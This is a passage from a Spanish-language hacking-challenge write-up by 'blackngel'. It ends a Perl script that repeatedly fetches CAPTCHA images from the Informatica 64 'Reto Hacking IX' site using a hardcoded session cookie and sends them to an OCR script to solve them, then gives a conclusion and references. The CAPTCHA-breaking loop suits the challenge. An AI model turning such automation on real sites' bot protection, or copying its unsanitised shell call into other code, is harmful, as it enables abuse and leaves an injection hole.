+5158074C106455D0AFE2421D0058A6CA2C4258523C74ED746C0ABC755E3C4378EDD63D67013A41
+A2DEA67D45A97096AF4AF6F1A694; ASP.NET_SessionId=43qmmfrhpgvsffitm3lafmm3';
+
+my $useragent = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)
+                 Gecko/2008072820 Firefox/3.0.1';
+
+my @header = ('User-Agent' => $useragent, 'Cookie' => $cookie,
+              'Connection' => 'keep-alive', 'Keep-Alive' => '300');
+
+while(1) {
+my $url = 'http://retohacking9.elladodelmal.com/Niveles/Nivel04/Default.aspx';
+my $response = $ua->post($url, @header);
+
+my $content = $response->content;
+
+my $x = index($content, "ImgCapcha") + 16;
+$content = substr($content, $x);
+$x = index($content, "style") - 2;
+my $img = substr($content, 0, $x);
+
+$req = HTTP::Request->new(GET => "http://retohacking9.elladodelmal.com/
+                                  Niveles/Nivel04/$img");
+$request = $ua->request($req);
+
+open(IMAGEN, ">captcha.gif") || die "No se pudo crear archivo: $!";
+binmode IMAGEN;
+print IMAGEN $request->content;
+close IMAGEN;
+
+my $code = substr($img, 9);
+
+my $salida = `php ocr.php -f captcha.gif -l $code`;
+print "\n$salida\n";
+print "\n";
+
+}
+
+-[ end learn.pl ]-
+
+Recuerda que, al igual que en el script "reto_cap.pl", debes cambiar los
+valores de la variable $cookie por aquellos que se correspondan con tu sesion.
+
+
+
+---[ 6 - Conclusion
+
+Como se ha podido ver, puede que no sea la implementacion mas limpia, y
+ademas no utiliza ninguna clase de algoritmo complejo, pero si es una
+solucion completamente valida, y tan solo hace falta adaptar el modo de
+descarga de la imagen en cada nivel respectivo para que funcione
+correctamente.
+
+Lo correcto hubiera sido intentar programar todas las operaciones en una
+misma aplicacion y con un mismo lenguaje. Perl en si mismo puede ser una
+estupenda opcion si se sabe como manejar los graficos con el, os remito a
+una estupenda referencia sobre esto en [3].
+
+Java tampoco seria un lenguaje a despreciar, ya que tiene formas (librerias)
+increiblemente sencillas para tratar con imagenes o composicion de graficos,
+solo que la tarea de interactuar con una web a modo de web-scraping requiere
+un poco mas de paciencia y estudio.
+
+Sea como fuere, el hacker siempre debe buscar un equilibrio entre eficiencia
+y eficacia. Para desarrollos e invetigaciones personales, o con metas de
+futuro, uno debe utilizar toda su magia para encontrar el metodo mas eficiente,
+pero un reto es un reto, y para superarlo simplemente debemos hacer que
+funcione. No es asi?
+
+
+Feliz Hacking!
+blackngel
+
+
+
+---[ 7 - Referencias
+
+[1] Captcha Killer (Reto 9 Informatica 64)
+    http://retohackin9.elladodelmal.com
+
+[2] Reto Hacking IX de Informatica 64
+    http://www.kachakil.com/retos/I64_Reto_9.pdf
+
+[3] Graphics Programming with Perl
+    http://man.lupaworld.com/content/develop/Perl/Graphics_Programming_With_
+    Perl.pdf
+
+*EOF*
